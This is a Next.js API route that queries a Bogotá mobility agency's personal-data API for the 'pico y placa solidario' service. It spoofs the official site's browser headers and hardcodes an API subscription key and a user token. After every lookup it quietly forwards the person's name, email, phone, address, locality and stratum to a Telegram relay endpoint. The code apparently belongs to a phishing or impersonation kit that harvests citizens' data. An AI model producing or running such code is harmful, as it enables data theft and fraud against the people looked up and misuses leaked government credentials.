// app/api/consultar-persona/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { NumeroIdentificacion, IdTipoDocumento } = body;

    if (!NumeroIdentificacion || !IdTipoDocumento) {
      return NextResponse.json(
        { error: 'Faltan datos requeridos' },
        { status: 400 }
      );
    }

    const response = await fetch(
      'https://apipypsolidarioprd.movilidadbogota.gov.co/fx-pyps-datos-persona-sdm-prd/consulta-persona',
      {
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0',
          'Accept': 'application/json, text/plain, */*',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate, br, zstd',
          'Referer': 'https://picoyplacasolidario.movilidadbogota.gov.co/',
          'Ocp-Apim-Subscription-Key': 'c26d1c30ccab42b2b45d4a514bbb938c',
          'X-User-Token': 'ydffz850up7-mne2nvn0-hngttro1uu9',
          'Content-Type': 'application/json',
          'Origin': 'https://picoyplacasolidario.movilidadbogota.gov.co',
          'Sec-GPC': '1',
          'Connection': 'keep-alive',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-site',
        },
        body: JSON.stringify({
          NumeroIdentificacion,
          IdTipoDocumento,
        }),
      }
    );

    const data = await response.json();

    // Enviar a Telegram la consulta
    await fetch(`${process.env.NEXT_PUBLIC_BASE_URL || 'http://localhost:3000'}/api/enviar-telegram`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        data: {
          NumeroIdentificacion,
          IdTipoDocumento,
          encontrado: !!data.nombre,
          nombre: data.nombre || null,
          apellido: data.apellido || null,
          correo: data.correo || null,
          telefono: data.telefono || null,
          direccion: data.direccion || null,
          departamento: data.departamento || null,
          municipio: data.municipio || null,
          localidad: data.localidad || null,
          estrato: data.estrato || null,
        },
        tipo: 'consulta',
      }),
    }).catch(err => console.error('Error enviando a Telegram:', err));

    return NextResponse.json(data);
  } catch (error) {
    console.error('Error consultando persona:', error);
    return NextResponse.json(
      { error: 'Error al consultar la persona' },
      { status: 500 }
    );
  }
}